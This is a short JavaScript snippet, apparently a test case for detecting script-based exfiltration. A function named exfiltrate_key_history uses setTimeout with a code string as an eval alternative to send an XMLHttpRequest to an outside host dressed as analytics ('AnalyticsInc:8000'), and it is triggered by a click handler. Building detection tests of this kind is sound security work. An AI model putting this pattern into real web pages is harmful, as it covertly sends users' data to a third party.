function exfiltrate_key_history() {

    // Timeout - Eval Alternative - No Obfuscation
    // Exfiltrate data using XMLHTTP request
    var exp='xmlhttp=new XMLHttpRequest();xmlhttp.open("GET", "http://AnalyticsInc:8000/submission.html?test=timeout", true);xmlhttp.send(null);';
	setTimeout(exp, 10);
	
}

document.getElementById('test').onclick = exfiltrate_key_history;
